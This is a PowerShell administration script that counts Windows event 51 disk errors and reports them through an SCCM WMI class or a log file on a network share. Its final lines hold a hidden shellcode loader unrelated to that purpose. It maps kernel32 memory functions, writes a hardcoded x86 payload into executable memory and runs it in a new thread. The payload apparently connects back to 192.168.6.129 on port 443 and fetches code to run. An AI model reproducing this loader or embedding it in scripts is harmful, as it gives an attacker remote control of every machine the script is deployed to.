
param
(
	[switch]$SCCM,
	[switch]$NetworkShare,
	[string]$NetworkSharePath,
	[switch]$SCCMImport
)
function Initialize-HardwareInventory {

	
	[CmdletBinding()]
	param ()
	
	$Output = "Initiate SCCM Hardware Inventory....."
	$SMSCli = [wmiclass] "\\localhost\root\ccm:SMS_Client"
	$ErrCode = ($SMSCli.TriggerSchedule("{00000000-0000-0000-0000-000000000001}")).ReturnValue
	If ($ErrCode -eq $null) {
		$Output += "Success"
	} else {
		$Output += "Failed"
	}
	Write-Output $Output
}

function New-WMIClass {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][string]$Class
	)
	
	$WMITest = Get-WmiObject $Class -ErrorAction SilentlyContinue
	If (($WMITest -ne "") -and ($WMITest -ne $null)) {
		$Output = "Deleting " + $Class + " WMI class....."
		Remove-WmiObject $Class
		$WMITest = Get-WmiObject $Class -ErrorAction SilentlyContinue
		If ($WMITest -eq $null) {
			$Output += "Success"
		} else {
			$Output += "Failed"
			Exit 1
		}
		Write-Output $Output
	}
	$Output = "Creating " + $Class + " WMI class....."
	$newClass = New-Object System.Management.ManagementClass("root\cimv2", [string]::Empty, $null);
	$newClass["__CLASS"] = $Class;
	$newClass.Qualifiers.Add("Static", $true)
	$newClass.Properties.Add("Error51", [System.Management.CimType]::string, $false)
	$newClass.Properties["Error51"].Qualifiers.Add("key", $true)
	$newClass.Properties["Error51"].Qualifiers.Add("read", $true)
	$newClass.Put() | Out-Null
	$WMITest = Get-WmiObject $Class -ErrorAction SilentlyContinue
	If ($WMITest -eq $null) {
		$Output += "Success"
	} else {
		$Output += "Failed"
		Exit 1
	}
	Write-Output $Output
}

function New-WMIInstance {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][string]$Error51,
		[ValidateNotNullOrEmpty()][string]$Class
	)
	
	$Output = "Writing Error 51 information instance to" + [char]32 + $Class + [char]32 + "class....."
	$Return = Set-WmiInstance -Class $Class -Arguments @{ Error51 = $Error51 }
	If ($Return -like "*" + $Error51 + "*") {
		$Output += "Success"
	} else {
		$Output += "Failed"
	}
	Write-Output $Output
}

function Remove-WMIClass {

	
	[CmdletBinding()]
	param
	(
		[ValidateNotNullOrEmpty()][string]$Class
	)
	
	$WMITest = Get-WmiObject $Class -ErrorAction SilentlyContinue
	If (($WMITest -ne "") -and ($WMITest -ne $null)) {
		$Output = "Deleting " + $Class + " WMI class....."
		Remove-WmiObject $Class
		$WMITest = Get-WmiObject $Class -ErrorAction SilentlyContinue
		If ($WMITest -eq $null) {
			$Output += "Success"
		} else {
			$Output += "Failed"
			Exit 1
		}
		Write-Output $Output
	}
}

Clear-Host

[int]$Count = (Get-WinEvent -FilterHashtable @{ logname = 'system'; ID = 51 } -ErrorAction SilentlyContinue).Count
If ($SCCMImport.IsPresent) {
	
	New-WMIClass -Class DriveReporting
	
	New-WMIInstance -Class DriveReporting -Error51 5
} else {
	If ($Count -gt 0) {
		$Output = "Event 51 disk error has occurred $Count times."
		Write-Output $Output
		
		If ($SCCM.IsPresent) {
			
			New-WMIClass -Class DriveReporting
			
			New-WMIInstance -Class DriveReporting -Error51 $Count
			
			Initialize-HardwareInventory
		}
		
		If ($NetworkShare.IsPresent) {
			
			If ($NetworkSharePath[$NetworkSharePath.Length - 1] -ne "\") {
				$NetworkSharePath += "\"
			}
			
			$File = $NetworkSharePath + $env:COMPUTERNAME + ".log"
			
			If ((Test-Path $File) -eq $true) {
				$Output = "Deleting " + $env:COMPUTERNAME + ".log....."
				Remove-Item -Path $File -Force | Out-Null
				If ((Test-Path $File) -eq $false) {
					$Output += "Success"
				} else {
					$Output += "Failed"
				}
				Write-Output $Output
			}
			
			$Output = "Creating " + $env:COMPUTERNAME + ".log....."
			New-Item -Path $File -ItemType File -Force | Out-Null
			Add-Content -Path $File -Value "Event 51 Count: $Count" -Force
			If ((Test-Path $File) -eq $true) {
				$Output += "Success"
			} else {
				$Output += "Failed"
			}
			Write-Output $Output
		}
	} else {
		$Output = "No event 51 disk errors detected."
		Write-Output $Output
		
		If ($SCCM.IsPresent) {
			Remove-WMIClass -Class DriveReporting
		}
		
		If ($NetworkShare.IsPresent) {
			If ($NetworkSharePath[$NetworkSharePath.Length - 1] -ne "\") {
				$NetworkSharePath += "\"
			}
			$File = $NetworkSharePath + $env:COMPUTERNAME + ".log"
			If ((Test-Path $File) -eq $true) {
				$Output = "Deleting " + $env:COMPUTERNAME + ".log....."
				Remove-Item -Path $File -Force | Out-Null
				If ((Test-Path $File) -eq $false) {
					$Output += "Success"
				} else {
					$Output += "Failed"
				}
				Write-Output $Output
			}
		}
	}
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x06,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

